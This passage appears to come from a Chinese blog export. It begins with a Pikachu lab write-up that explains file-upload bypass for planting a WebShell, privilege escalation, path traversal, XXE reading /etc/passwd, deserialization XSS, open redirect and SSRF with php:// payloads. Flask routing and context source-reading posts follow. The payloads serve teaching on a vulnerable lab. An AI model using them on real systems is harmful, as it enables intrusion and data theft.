即可绕过服务端校验\n漏洞代码解读if(isset($_POST[&#x27;submit&#x27;]))&#123;//     var_dump($_FILES);    $mime=array(&#x27;image/jpg&#x27;,&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;);//指定MIME类型,这里只是对MIME类型做了判断。    $save_path=&#x27;uploads&#x27;;//指定在当前目录建立一个目录    $upload=upload_sick(&#x27;uploadfile&#x27;,$mime,$save_path);//调用函数    if($upload[&#x27;return&#x27;])&#123;        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;文件上传成功&lt;/p&gt;&lt;p class=&#x27;notice&#x27;&gt;文件保存的路径为：&#123;$upload[&#x27;new_path&#x27;]&#125;&lt;/p&gt;&quot;;    &#125;else&#123;        $html.=&quot;&lt;p class=notice&gt;&#123;$upload[&#x27;error&#x27;]&#125;&lt;/p&gt;&quot;;    &#125;&#125;\n\ngetimagesize漏洞利用尽管我没有在这关的源代码里找到 getimagesize 函数，但在绕过该函数的检验时，攻击者需要在文件内容起始处加上 GIF89a 以表明该文件是一个图片。随后正常连接 WebShell 即可\n漏洞代码解读if(isset($_POST[&#x27;submit&#x27;]))&#123;    $type=array(&#x27;jpg&#x27;,&#x27;jpeg&#x27;,&#x27;png&#x27;);//指定类型    $mime=array(&#x27;image/jpg&#x27;,&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;);    $save_path=&#x27;uploads&#x27;.date(&#x27;/Y/m/d/&#x27;);//根据当天日期生成一个文件夹    $upload=upload(&#x27;uploadfile&#x27;,&#x27;512000&#x27;,$type,$mime,$save_path);//调用函数    if($upload[&#x27;return&#x27;])&#123;        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;文件上传成功&lt;/p&gt;&lt;p class=&#x27;notice&#x27;&gt;文件保存的路径为：&#123;$upload[&#x27;save_path&#x27;]&#125;&lt;/p&gt;&quot;;    &#125;else&#123;        $html.=&quot;&lt;p class=notice&gt;&#123;$upload[&#x27;error&#x27;]&#125;&lt;/p&gt;&quot;;    &#125;&#125;\n\nOver Permission (越权漏洞)概述以较小的权限执行了本应无法执行的操作叫做越权操作。存在越权操作漏洞，即越权漏洞的成因是后端没有进行合理的鉴权。越权是最有代表性的逻辑漏洞之一。\n水平越权漏洞利用使用提示中给出的账号登陆，会得到一个查看个人信息的接口，该接口没有进行鉴权，根据 HTTP GET 参数 username 返回用户信息，修改该参数值即可查看其它用户信息甚至脱库\n漏洞代码解读if(isset($_GET[&#x27;submit&#x27;]) &amp;&amp; $_GET[&#x27;username&#x27;]!=null)&#123;    //没有使用session来校验,而是使用的传进来的值，权限校验出现问题,这里应该跟登录态关系进行绑定    $username=escape($link, $_GET[&#x27;username&#x27;]);    $query=&quot;select * from member where username=&#x27;$username&#x27;&quot;;    $result=execute($link, $query);    if(mysqli_num_rows($result)==1)&#123;        $data=mysqli_fetch_assoc($result);        $uname=$data[&#x27;username&#x27;];        $sex=$data[&#x27;sex&#x27;];        $phonenum=$data[&#x27;phonenum&#x27;];        $add=$data[&#x27;address&#x27;];        $email=$data[&#x27;email&#x27;];        $html.=&lt;&lt;&lt;A&lt;div id=&quot;per_info&quot;&gt;   &lt;h1 class=&quot;per_title&quot;&gt;hello,&#123;$uname&#125;,你的具体信息如下：&lt;/h1&gt;   &lt;p class=&quot;per_name&quot;&gt;姓名:&#123;$uname&#125;&lt;/p&gt;   &lt;p class=&quot;per_sex&quot;&gt;性别:&#123;$sex&#125;&lt;/p&gt;   &lt;p class=&quot;per_phone&quot;&gt;手机:&#123;$phonenum&#125;&lt;/p&gt;       &lt;p class=&quot;per_add&quot;&gt;住址:&#123;$add&#125;&lt;/p&gt;    &lt;p class=&quot;per_email&quot;&gt;邮箱:&#123;$email&#125;&lt;/p&gt; &lt;/div&gt;A;    &#125;&#125;\n\n垂直越权漏洞利用以普通用户的 cookie 可以执行 admin 管理员账户的创建用户操作。\n漏洞代码解读//这里只是验证了登录状态，并没有验证级别，所以存在越权问题。if(!check_op2_login($link))&#123;    header(&quot;location:op2_login.php&quot;);    exit();&#125;if(isset($_POST[&#x27;submit&#x27;]))&#123;    if($_POST[&#x27;username&#x27;]!=null &amp;&amp; $_POST[&#x27;password&#x27;]!=null)&#123;//用户名密码必填        $getdata=escape($link, $_POST);//转义        $query=&quot;insert into member(username,pw,sex,phonenum,email,address) values(&#x27;&#123;$getdata[&#x27;username&#x27;]&#125;&#x27;,md5(&#x27;&#123;$getdata[&#x27;password&#x27;]&#125;&#x27;),&#x27;&#123;$getdata[&#x27;sex&#x27;]&#125;&#x27;,&#x27;&#123;$getdata[&#x27;phonenum&#x27;]&#125;&#x27;,&#x27;&#123;$getdata[&#x27;email&#x27;]&#125;&#x27;,&#x27;&#123;$getdata[&#x27;address&#x27;]&#125;&#x27;)&quot;;        $result=execute($link, $query);        if(mysqli_affected_rows($link)==1)&#123;//判断是否插入            header(&quot;location:op2_admin.php&quot;);        &#125;else &#123;            $html.=&quot;&lt;p&gt;修改失败,请检查下数据库是不是还是活着的&lt;/p&gt;&quot;;        &#125;    &#125;&#125;\n\n目录穿越概述在 web 功能设计中,很多时候会将用户可能访问的文件路径设置为变量，从而让前端的功能设计更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后端，后端再响应对应的文件。在这个过程中，如果后端没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过 “..&#x2F;” 相对路径访问到违法路径下的文件。\n目录穿越漏洞利用可通过该页面配合 ..&#x2F; 访问任意文件\n漏洞代码解读if(isset($_GET[&#x27;title&#x27;]))&#123;    $filename=$_GET[&#x27;title&#x27;];    //这里直接把传进来的内容进行了require(),造成问题    require &quot;soup/$filename&quot;;//    echo $html;&#125;\n\n敏感信息泄漏概述出于开发者的疏忽或者不当的设计，不应该被用户看到的数据可能会被轻易地访问到\n\n通过访问url下的目录，可以直接列出目录下的文件列表;\n输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;\n前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;\n\n包括但不限于以上情况被称为敏感信息泄露。敏感信息泄露虽然一直被评为危害比较低的漏洞，但这些敏感信息往往会为攻击者进一步地攻击提供很大的帮助甚至直接造成严重的损失\nfind abc漏洞利用在前端源代码中可以发现登陆账号与密码\n漏洞代码解读测试账号:lili/123456\n\nPHP 反序列化概述如果反序列化的内容是用户可以控制的,且后台不正确的使用了 PHP 中的魔法函数,就会导致安全问题\nPHP 反序列化漏洞利用阅读源代码后可得出 POC\nO:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;\n\n漏洞代码解读class S&#123;    var $test = &quot;pikachu&quot;;    function __construct()&#123;        echo $this-&gt;test;    &#125;&#125;$html=&#x27;&#x27;;if(isset($_POST[&#x27;o&#x27;]))&#123;    $s = $_POST[&#x27;o&#x27;];    if(!@$unser = unserialize($s))&#123;        $html.=&quot;&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;&quot;;    &#125;else&#123;        $html.=&quot;&lt;p&gt;&#123;$unser-&gt;test&#125;&lt;/p&gt;&quot;;    &#125;&#125;\n\nXXE概述XXE , xml external entity injection ， 即 XML 外部实体注入漏洞，其利用原理是攻击者向服务器注入精心构造的恶意 XML 实体内容，从而让服务器按照指定配置进行执行，从而导致问题\nXXE漏洞利用阅读源码后得出的 POC 与 payload 如下\n&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE note [    &lt;!ENTITY hacker &quot;7erry&quot;&gt;]&gt;&lt;name&gt;&amp;hacker;&lt;/name&gt;\n\n&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [    &lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;x&gt;&amp;f;&lt;/x&gt;\n\n漏洞代码解读if(isset($_POST[&#x27;submit&#x27;]) and $_POST[&#x27;xml&#x27;] != null)&#123;    $xml =$_POST[&#x27;xml&#x27;];//    $xml = $test;    $data = @simplexml_load_string($xml,&#x27;SimpleXMLElement&#x27;,LIBXML_NOENT);    if($data)&#123;        $html.=&quot;&lt;pre&gt;&#123;$data&#125;&lt;/pre&gt;&quot;;    &#125;else&#123;        $html.=&quot;&lt;p&gt;XML声明、DTD文档类型定义、文档元素这些都搞懂了吗?&lt;/p&gt;&quot;;    &#125;&#125;\n\nURL 重定向概述不安全的 url 跳转问题可能发生在一切执行了 url 地址跳转的地方。如果后端采用了前端传进来的(可能是用户传参,或者之前预埋在前端页面的 url 地址)参数作为了跳转的目的地,而又没有做判断的话就可能发生”跳错对象”的问题。\nurl 跳转比较直接的危害是:–&gt;钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站\n不安全的 URL 跳转漏洞利用页面会跳转到 HTTP GET 请求参数 url 指定的 url 处，填入钓鱼网站 url 即可实现利用\n漏洞代码解读if(isset($_GET[&#x27;url&#x27;]) &amp;&amp; $_GET[&#x27;url&#x27;] != null)&#123;    $url = $_GET[&#x27;url&#x27;];    if($url == &#x27;i&#x27;)&#123;        $html.=&quot;&lt;p&gt;好的,希望你能坚持做你自己!&lt;/p&gt;&quot;;    &#125;else &#123;        header(&quot;location:&#123;$url&#125;&quot;);    &#125;&#125;\n\nSSRF概述SSRF ( Server-Side Request Forgery ) 服务器端请求伪造，即发生在服务器端的 CSRF XD\n其形成的原因大都是由于服务端基于某种业务的需要，提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求，从而访问到内网的资源或以该 Wedb Server 为跳板对内外网的其它应用进行攻击\nSSRF (curl)漏洞利用观察 url 很容易发现目标页面通过 GET 请求的 url 参数对指定 url 的内容进行获取，可通过 http , file , dict ， gopher 等万能协议与 PHP 伪协议访问内外网资源\n漏洞代码解读if(isset($_GET[&#x27;url&#x27;]) &amp;&amp; $_GET[&#x27;url&#x27;] != null)&#123;    //接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF    $URL = $_GET[&#x27;url&#x27;];    $CH = curl_init($URL);    curl_setopt($CH, CURLOPT_HEADER, FALSE);    curl_setopt($CH, CURLOPT_SSL_VERIFYPEER, FALSE);    $RES = curl_exec($CH);    curl_close($CH) ;//ssrf的问题是:前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端。//除了http/https外,curl还支持一些其他的协议curl --version 可以查看其支持的协议,telnet//curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP    echo $RES;&#125;\n\nSSRF (file_get_content)漏洞利用大体上与基于 curl 的 SSRF 漏洞利用一致\n漏洞代码解读//读取PHP文件的源码:php://filter/read=convert.base64-encode/resource=ssrf.php//内网请求:http://x.x.x.x/xx.indexif(isset($_GET[&#x27;file&#x27;]) &amp;&amp; $_GET[&#x27;file&#x27;] !=null)&#123;    $filename = $_GET[&#x27;file&#x27;];    $str = file_get_contents($filename);    echo $str;&#125;\n\nReferencePikachu使用CSRF盗取SELF-XSS的Cookie\n","categories":["Tech Blog"]},{"title":"RE:从0开始阅读Flask源码 Ⅲ","url":"/2024/04/24/Tech%20Blog/RE-%E4%BB%8E0%E5%BC%80%E5%A7%8B%E9%98%85%E8%AF%BBFlask%E6%BA%90%E7%A0%81-%E2%85%A2/","content":"一个 Web 应用针对不同的请求路径会有不同的处理函数，而路由就是根据 HTTP 请求的 URL 找到对应处理函数的过程。Flask 的路由实现较为轻量，更为底层的路由处理逻辑由 WerkZeug 实现，在此系列博客中暂不进行深入的探讨，让我们先从经典的 Flask Demo 开始讨论\n\n\nFlask Demofrom flask import Flaskapp = Flask(__name__)@app.route(&quot;/&quot;)def index():    return &quot;HelloWorld&quot;if __name__ == &quot;__main__&quot;:    app.run()\n\n路由注册&#x2F;视图函数注册的流程Flask Demo 使用了以下代码创建了一个视图函数\n@app.route(&quot;/index&quot;)def index():    return &quot;HelloWorld&quot;\n\n不难理解，该视图函数会用于处理 URL 为 &#x2F;index 的请求并响应 HelloWorld 字符串。其中最引人注目的是视图函数上方的装饰器，Flask 可以通过使用 route 装饰器对视图函数进行注册。阅读 route 方法的源代码\n@setupmethoddef route(self, rule: str, **options: t.Any) -&gt; t.Callable[[T_route], T_route]:    &quot;&quot;&quot;Decorate a view function to register it with the given URL    rule and options. Calls :meth:`add_url_rule`, which has more    details about the implementation.    .. code-block:: python        @app.route(&quot;/&quot;)        def index():            return &quot;Hello, World!&quot;    See :ref:`url-route-registrations`.    The endpoint name for the route defaults to the name of the view    function if the ``endpoint`` parameter isn&#x27;t passed.    The ``methods`` parameter defaults to ``[&quot;GET&quot;]``. ``HEAD`` and    ``OPTIONS`` are added automatically.    :param rule: The URL rule string.    :param options: Extra options passed to the        :class:`~werkzeug.routing.Rule` object.    &quot;&quot;&quot;    def decorator(f: T_route) -&gt; T_route:        endpoint = options.pop(&quot;endpoint&quot;, None)        self.add_url_rule(rule, endpoint, f, **options)        return f    return decorator\n\n阅读后可以得知，route 装饰器的效果，就是让视图函数在执行自身原本的功能以外，再额外根据传入的 rule 参数值与可选传入的 endpoint 参数值执行 add_url_rule 方法。即 Flask Demo 中的代码实际上等价于\ndef index():    return &quot;HelloWorld&quot;app.add_url_rule(&quot;/index&quot;,index)\n\n也就是说，视图函数的注册是通过 add_url_rule 方法实现的，让我们进一步阅读 add_url_rule 方法的源代码\n# scaffold.py@setupmethoddef add_url_rule(    self,    rule: str,    endpoint: str | None = None,    view_func: ft.RouteCallable | None = None,    provide_automatic_options: bool | None = None,    **options: t.Any,) -&gt; None:    &quot;&quot;&quot;Register a rule for routing incoming requests and building    URLs. The :meth:`route` decorator is a shortcut to call this    with the ``view_func`` argument. These are equivalent:    .. code-block:: python        @app.route(&quot;/&quot;)        def index():            ...    .. code-block:: python        def index():            ...        app.add_url_rule(&quot;/&quot;, view_func=index)    See :ref:`url-route-registrations`.    The endpoint name for the route defaults to the name of the view    function if the ``endpoint`` parameter isn&#x27;t passed. An error    will be raised if a function has already been registered for the    endpoint.    The ``methods`` parameter defaults to ``[&quot;GET&quot;]``. ``HEAD`` is    always added automatically, and ``OPTIONS`` is added    automatically by default.    ``view_func`` does not necessarily need to be passed, but if the    rule should participate in routing an endpoint name must be    associated with a view function at some point with the    :meth:`endpoint` decorator.    .. code-block:: python        app.add_url_rule(&quot;/&quot;, endpoint=&quot;index&quot;)        @app.endpoint(&quot;index&quot;)        def index():            ...    If ``view_func`` has a ``required_methods`` attribute, those    methods are added to the passed and automatic methods. If it    has a ``provide_automatic_methods`` attribute, it is used as the    default if the parameter is not passed.    :param rule: The URL rule string.    :param endpoint: The endpoint name to associate with the rule        and view function. Used when routing and building URLs.        Defaults to ``view_func.__name__``.    :param view_func: The view function to associate with the        endpoint name.    :param provide_automatic_options: Add the ``OPTIONS`` method and        respond to ``OPTIONS`` requests automatically.    :param options: Extra options passed to the        :class:`~werkzeug.routing.Rule` object.    &quot;&quot;&quot;    raise NotImplementedError\n\n这是在 route 方法所在的 scaffold.py 文件下的 add_url_rule 方法的定义，通过注释验证并补充了我们之前得出的结论，即 Flask Demo 中注册视图函数的代码实际上等价于\ndef index():    return &quot;HelloWorld&quot;app.add_url_rule(&quot;/index&quot;,&quot;index&quot;,index)\n\n在进行视图函数的注册时，endpoint 的值默认等于视图函数名。如果不相等则需要通过 endpoint 装饰器将视图函数与 endpoint 进行绑定。\n奇怪的是，add_url_rule 方法什么都没做，而只是抛出了未实现的异常。继续搜索 add_url_rule 方法可以发现，scaffold.py 文件下的 add_url_rule 方法处在 Scaffold 类中，在同目录下的 app.py 文件的 App 类则通过继承 Scaffold 类完成了 add_url_rule 方法的具体实现\n# app.py@setupmethoddef add_url_rule(    self,    rule: str,    endpoint: str | None = None,    view_func: ft.RouteCallable | None = None,    provide_automatic_options: bool | None = None,    **options: t.Any,) -&gt; None:    if endpoint is None:        endpoint = _endpoint_from_view_func(view_func)  # type: ignore    options[&quot;endpoint&quot;] = endpoint    methods = options.pop(&quot;methods&quot;, None)    # if the methods are not given and the view_func object knows its    # methods we can use that instead.  If neither exists, we go with    # a tuple of only ``GET`` as default.    if methods is None:        methods = getattr(view_func, &quot;methods&quot;, None) or (&quot;GET&quot;,)    if isinstance(methods, str):        raise TypeError(            &quot;Allowed methods must be a list of strings, for&quot;            &#x27; example: @app.route(..., methods=[&quot;POST&quot;])&#x27;        )    methods = &#123;item.upper() for item in methods&#125;    # Methods that should always be added    required_methods = set(getattr(view_func, &quot;required_methods&quot;, ()))    # starting with Flask 0.8 the view_func object can disable and    # force-enable the automatic options handling.    if provide_automatic_options is None:        provide_automatic_options = getattr(            view_func, &quot;provide_automatic_options&quot;, None        )    if provide_automatic_options is None:        if &quot;OPTIONS&quot; not in methods:            provide_automatic_options = True            required_methods.add(&quot;OPTIONS&quot;)        else:            provide_automatic_options = False    # Add the required methods now.    methods |= required_methods    rule_obj = self.url_rule_class(rule, methods=methods, **options)    rule_obj.provide_automatic_options = provide_automatic_options  # type: ignore[attr-defined]    self.url_map.add(rule_obj)    if view_func is not None:        old_func = self.view_functions.get(endpoint)        if old_func is not None and old_func != view_func:            raise AssertionError(                &quot;View function mapping is overwriting an existing&quot;                f&quot; endpoint function: &#123;endpoint&#125;&quot;            )        self.view_functions[endpoint] = view_func\n\n首先，如果 endpoint 为 None ，即 endpoint 为默认值，则调用 _endpoint_from_view_func 函数初始化 endpoint\nif endpoint is None:    endpoint = _endpoint_from_view_func(view_func)  # type: ignoreoptions[&quot;endpoint&quot;] = endpoint\n\n_endpoint_from_view_func 函数源代码为\ndef _endpoint_from_view_func(view_func: ft.RouteCallable) -&gt; str:    &quot;&quot;&quot;Internal helper that returns the default endpoint for a given    function.  This always is the function name.    &quot;&quot;&quot;    assert view_func is not None, &quot;expected view func if endpoint is not provided.&quot;    return view_func.__name__\n\n其功能为返回该函数的函数名，与之前阅读注释时获悉的 endpoint 默认为 view_function 函数名这一点相吻合\nmethods = options.pop(&quot;methods&quot;, None)# if the methods are not given and the view_func object knows its# methods we can use that instead.  If neither exists, we go with# a tuple of only ``GET`` as default.if methods is None:    methods = getattr(view_func, &quot;methods&quot;, None) or (&quot;GET&quot;,)if isinstance(methods, str):    raise TypeError(        &quot;Allowed methods must be a list of strings, for&quot;        &#x27; example: @app.route(..., methods=[&quot;POST&quot;])&#x27;    )methods = &#123;item.upper() for item in methods&#125;\n\n随后，从参数列表中取出 methods 参数，其默认值为 None 。若调用 add_url_rule 方法时未提供，则根据 view_function 的 methods 属性取值，如果仍为 None 则默认为 GET ，即默认路由 HTTP GET 请求。需要注意的是 methods 应该是一个元组而非字符串，否则会抛出 TypeError\n# Methods that should always be addedrequired_methods = set(getattr(view_func, &quot;required_methods&quot;, ()))# starting with Flask 0.8 the view_func object can disable and# force-enable the automatic options handling.if provide_automatic_options is None:    provide_automatic_options = getattr(        view_func, &quot;provide_automatic_options&quot;, None    )if provide_automatic_options is None:    if &quot;OPTIONS&quot; not in methods:        provide_automatic_options = True        required_methods.add(&quot;OPTIONS&quot;)    else:        provide_automatic_options = False# Add the required methods now.methods |= required_methods\n\n随后 add_url_rule 方法会以类似的逻辑确认 required_methods ，required_methods 是 view_function 默认支持的 HTTP 请求方法，它会被添加到 methods 中\nrule_obj = self.url_rule_class(rule, methods=methods, **options)rule_obj.provide_automatic_options = provide_automatic_options  # type: ignore[attr-defined]self.url_map.add(rule_obj)if view_func is not None:    old_func = self.view_functions.get(endpoint)    if old_func is not None and old_func != view_func:        raise AssertionError(            &quot;View function mapping is overwriting an existing&quot;            f&quot; endpoint function: &#123;endpoint&#125;&quot;        )    self.view_functions[endpoint] = view_func\n\n忽略处理 endpoint 与 methods 的相关逻辑后，这段代码就是 add_url_rule 方法实际上的工作内容，即更新 url_map 与 view_functions 两个成员。url_rule_class 即 Flask 表示 URL 规则的类，它默认为 WerkZeug 提供的 Rule 类。通过调用 add_url_rule 方法时提供的 rule 参数与根据前述规则构建的 methods 创建 Rule 类的实例 rule 并进行初始化后，add_url_rule 方法会将 rule 对象添加到 url_map 成员中。url_map 是一个 url_map_class 类的实例，后者是 Flask 表示 URL 规则与 endpoint 的映射的类，默认为 WerkZeug 提供的 Map 类。然后，add_url_rule 方法会从 view_functions 成员中检索 endpoint 参数对应的 view_function ，若该 endpoint 存在对应的 view_function 且与 view_function 参数指向的 view_function 不一致则抛出 AssertionError，这一判断的目的是为确保每个 view_function 的 endpoint 不重复。view_functions 成员是一个以 endpoint （str）与 view_function （RouteCallable）为键值对的字典，如果该检测通过，则将该 endpoint 与 view_function 插入到 view_functions 中\n因此，Flask Demo 中视图函数的注册实际上是这样进行的\n# app = Flask(__name__)def index():    return &quot;HelloWorld&quot;rule_obj = app.url_rule_class(&quot;/index&quot;, methods=(&quot;GET&quot;,))app.url_map.add(rule_obj)app.view_functions[&quot;/index&quot;] = index\n\n路由分发请求到达 Flask Web Server 时 Flask 会为这个请求创建生命周期为从请求到来到结束响应为止的请求上下文，在请求上下文创建时，Flask 会根据从 WSGI 接口处获得的 environ 创建对应的 Request 对象，并通过同时创建的 WerkZeug 的 MapAdapter 对象的 match 方法解析获取该请求的 url_rule 与 view_args 然后放入到上下文的 request 成员的对应属性中。view_args 是动态路由获取到的 URL 路径参数。\nclass Flask(App):    def create_url_adapter(self, request: Request | None) -&gt; MapAdapter | None:        &quot;&quot;&quot;Creates a URL adapter for the given request. The URL adapter        is created at a point where the request context is not yet set        up so the request is passed explicitly.        .. versionadded:: 0.6        .. versionchanged:: 0.9           This can now also be called without a request object when the           URL adapter is created for the application context.        .. versionchanged:: 1.0            :data:`SERVER_NAME` no longer implicitly enables subdomain            matching. Use :attr:`subdomain_matching` instead.        &quot;&quot;&quot;        if request is not None:            # If subdomain matching is disabled (the default), use the            # default subdomain in all cases. This should be the default            # in Werkzeug but it currently does not have that feature.            if not self.subdomain_matching:                subdomain = self.url_map.default_subdomain or None            else:                subdomain = None            return self.url_map.bind_to_environ(                request.environ,                server_name=self.config[&quot;SERVER_NAME&quot;],                subdomain=subdomain,            )        # We need at the very least the server name to be set for this        # to work.        if self.config[&quot;SERVER_NAME&quot;] is not None:            return self.url_map.bind(                self.config[&quot;SERVER_NAME&quot;],                script_name=self.config[&quot;APPLICATION_ROOT&quot;],                url_scheme=self.config[&quot;PREFERRED_URL_SCHEME&quot;],            )        return Noneclass RequestContext:    def __init__(        self,        app: Flask,        environ: WSGIEnvironment,        request: Request | None = None,        session: SessionMixin | None = None,    ) -&gt; None:        self.app = app        if request is None:            request = app.request_class(environ)            request.json_module = app.json        self.request: Request = request        self.url_adapter = None        try:            self.url_adapter = app.create_url_adapter(self.request)        except HTTPException as e:            self.request.routing_exception = e        self.flashes: list[tuple[str, str]] | None = None        self.session: SessionMixin | None = session        # Functions that should be executed after the request on the response        # object.  These will be called before the regular &quot;after_request&quot;        # functions.        self._after_request_functions: list[ft.AfterRequestCallable[t.Any]] = []        self._cv_tokens: list[            tuple[contextvars.Token[RequestContext], AppContext | None]        ] = []    def match_request(self) -&gt; None:        &quot;&quot;&quot;Can be overridden by a subclass to hook into the matching        of the request.        &quot;&quot;&quot;        try:            result = self.url_adapter.match(return_rule=True)  # type: ignore            self.request.url_rule, self.request.view_args = result  # type: ignore        except HTTPException as e:            self.request.routing_exception = e\n\n这些数据会被 Flask 的 dispatch_request 方法获取以进行路由分发\ndef dispatch_request(self) -&gt; ft.ResponseReturnValue:    &quot;&quot;&quot;Does the request dispatching.  Matches the URL and returns the    return value of the view or error handler.  This does not have to    be a response object.  In order to convert the return value to a    proper response object, call :func:`make_response`.    .. versionchanged:: 0.7       This no longer does the exception handling, this code was       moved to the new :meth:`full_dispatch_request`.    &quot;&quot;&quot;    req = request_ctx.request    if req.routing_exception is not None:        self.raise_routing_exception(req)    rule: Rule = req.url_rule  # type: ignore[assignment]    # if we provide automatic options for this URL and the    # request came with the OPTIONS method, reply automatically    if (        getattr(rule, &quot;provide_automatic_options&quot;, False)        and req.method == &quot;OPTIONS&quot;    ):        return self.make_default_options_response()    # otherwise dispatch to the handler for that endpoint    view_args: dict[str, t.Any] = req.view_args  # type: ignore[assignment]    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]\n\ndispatch_request 方法首先会从该请求的上下文中获取到请求的相关参数，若该请求无路由异常便获取其路由规则，否则通过 raise_routing_exception 方法进入到异常处理流程。随后判断其路由规则是否开启了自动预检选项，若该选项开启且请求方式为 OPTIONS 则调用 make_default_options_response 自动预检请求并生成预检请求的响应\ndef make_default_options_response(self) -&gt; Response:    &quot;&quot;&quot;This method is called to create the default ``OPTIONS`` response.    This can be changed through subclassing to change the default    behavior of ``OPTIONS`` responses.    .. versionadded:: 0.7    &quot;&quot;&quot;    adapter = request_ctx.url_adapter    methods = adapter.allowed_methods()  # type: ignore[union-attr]    rv = self.response_class()    rv.allow.update(methods)    return rv\n\n对于其它的路由规则，dispatch_request 方法会直接通过该路由规则的 endpoint 值与 view_functions 这一视图函数跳转表传递参数执行 endpoint 对应的视图函数，实现路由分发并向上传递视图函数的返回值\n总结从上文的讨论中不难看出，Flask 的路由中由 HTTP 报文到具体 URL 规则这一步骤的核心逻辑是由 WerkZeug 实现的，Flask 在路由上的实现主要体现在由 URL 规则到 endpoint 与从 endpoint 到视图函数上\nFlask 的路由注册实质上就是通过 WerkZeug 提供的接口将 endpoint 与 URL 规则相关联，再将 endpoint 与对应的视图函数的键值对插入到 endpoint-view_function 的跳转表中；而其路由分发与动态路由则是通过请求上下文获取到经 WerkZeug 的 url_adapter 解析出的 URL 规则，并获取到该规则对应的 endpoint ，再以该 endpoint 为索引通过跳转表执行视图函数进行业务处理这一方式实现\nReferenceFlask RepoFlaskWerkZeugEndpoint in Flask Routing\n","categories":["Tech Blog"]},{"title":"RE:从0开始阅读Flask源码 Ⅳ","url":"/2024/05/10/Tech%20Blog/RE-%E4%BB%8E0%E5%BC%80%E5%A7%8B%E9%98%85%E8%AF%BBFlask%E6%BA%90%E7%A0%81-%E2%85%A3/","content":"程序的本质就是指令+上下文。\n作为一个 Web Application ，Flask 也必然有着自己的上下文。例如视图函数需要知道包括请求的方法，路径，参数等请求信息的上下文才能够正常的工作。如果你有过其它语言的编程经验，就会很容易想到通过在调用这些函数时在参数中传递相关的数据或这些数据的指针来为函数提供这些必要的上下文信息。如果这门语言支持 OOP ，那么这些请求相关的信息还可以被封装到请求的抽象类中。事实上，确实有不少框架是这样做的，例如 sanic 。但这样设计上下文的话，视图函数应该会长成这样\n# demo.py@app.route(path)def view_function(request):    ...\n\n也就是说，视图函数应该有 request 这么一个参数才对，但从 Flask Demo 中我们并没有发现这样一个参数。显然，Flask 采用了另外一种不同的实现方式。\n\n\nFlask 上下文的实现Flask 的上下文由类似于全局变量的方式实现，这些全局变量可以通过导入对应模块进行访问。\n# demo.pyfrom flask import Flask,requestapp = Flask(__name__)@app.route(&quot;/&quot;,endpoint=&quot;root&quot;)def hello_world():    if request.method ==&quot;GET&quot;:        print(request)    return &quot;hello！&quot;\n\n显然，这个全局变量必然需要进行某些设计，例如不同线程或协程之间的上下文应该各自保持独立以避免脏读脏写或竞争。同时这样的全局变量应当有多个，因为 Flask 的不同模块都有着自己不同用途的上下文需要处理。通过阅读源码可以发现这些全局变量都在 globals.py 中被定义，它的内容非常简单，具体如下\n# globals.pyfrom __future__ import annotationsimport typing as tfrom contextvars import ContextVarfrom werkzeug.local import LocalProxyif t.TYPE_CHECKING:  # pragma: no cover    from .app import Flask    from .ctx import _AppCtxGlobals    from .ctx import AppContext    from .ctx import RequestContext    from .sessions import SessionMixin    from .wrappers import Request_no_app_msg = &quot;&quot;&quot;\\Working outside of application context.This typically means that you attempted to use functionality that neededthe current application. To solve this, set up an application contextwith app.app_context(). See the documentation for more information.\\&quot;&quot;&quot;_cv_app: ContextVar[AppContext] = ContextVar(&quot;flask.app_ctx&quot;)app_ctx: AppContext = LocalProxy(  # type: ignore[assignment]    _cv_app, unbound_message=_no_app_msg)current_app: Flask = LocalProxy(  # type: ignore[assignment]    _cv_app, &quot;app&quot;, unbound_message=_no_app_msg)g: _AppCtxGlobals = LocalProxy(  # type: ignore[assignment]    _cv_app, &quot;g&quot;, unbound_message=_no_app_msg)_no_req_msg = &quot;&quot;&quot;\\Working outside of request context.This typically means that you attempted to use functionality that neededan active HTTP request. Consult the documentation on testing forinformation about how to avoid this problem.\\&quot;&quot;&quot;_cv_request: ContextVar[RequestContext] = ContextVar(&quot;flask.request_ctx&quot;)request_ctx: RequestContext = LocalProxy(  # type: ignore[assignment]    _cv_request, unbound_message=_no_req_msg)request: Request = LocalProxy(  # type: ignore[assignment]    _cv_request, &quot;request&quot;, unbound_message=_no_req_msg)session: SessionMixin = LocalProxy(  # type: ignore[assignment]    _cv_request, &quot;session&quot;, unbound_message=_no_req_msg)\n\n我们能够从源代码中看出，globals.py 首先创建了两个与上下文有关的错误信息与变量，_cv_app 与 _cv_request，随后通过它们创建了另外六个变量，即 app_ctx, current_app, g, request_ctx, request 和 session。这些全局变量尽管类型有所区别，但都由 LocalProxy 这个代理所操作的对象产生，查看其对应的签名可以发现其操作的对象所属的类分别与 _cv_app 和 _cv_request 一致\n# local.pyclass LocalProxy(    local: ContextVar[AppContext] | Local | LocalStack[AppContext] | (() -&gt; AppContext),    name: str | None = None,    *,    unbound_message: str | None = None)class LocalProxy(    local: ContextVar[RequestContext] | Local | LocalStack[RequestContext] | (() -&gt; RequestContext),    name: str | None = None,    *,    unbound_message: str | None = None)\n\n分别阅读这两个类的注释\n# ctx.pyAppContextThe app context contains 